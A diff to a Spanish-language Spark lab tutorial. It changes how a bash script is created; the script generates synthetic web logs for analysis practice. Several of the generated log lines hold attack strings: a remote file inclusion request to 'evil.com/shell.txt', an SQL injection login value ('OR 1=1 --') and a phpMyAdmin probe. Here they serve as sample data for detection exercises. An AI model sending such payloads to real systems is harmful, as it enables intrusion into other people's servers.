@@ -32,15 +32,10 @@ Entrar en el shell interactivo de Spark:
 
 Salir temporalmente del shell de Spark o abrir otra terminal en el contenedor.
 
-```bash
-nano generar_logs.sh
-```
-
 Contenido:
 
 ```bash
-#!/bin/bash
-
+echo '#!/bin/bash
 rm -f web_logs.txt
 
 for i in {1..200}
@@ -63,13 +58,13 @@ do
             echo "$ip GET /index.php?page=http://evil.com/shell.txt" >> web_logs.txt
             ;;
         4)
-            echo "$ip GET /login.php?user=admin' OR 1=1 --" >> web_logs.txt
+            echo "$ip GET /login.php?user=admin'\'' OR 1=1 --" >> web_logs.txt
             ;;
         5)
             echo "$ip GET /phpmyadmin" >> web_logs.txt
             ;;
     esac
-done
+done' > generar_logs.sh
 ```
 
 Ejecutar:
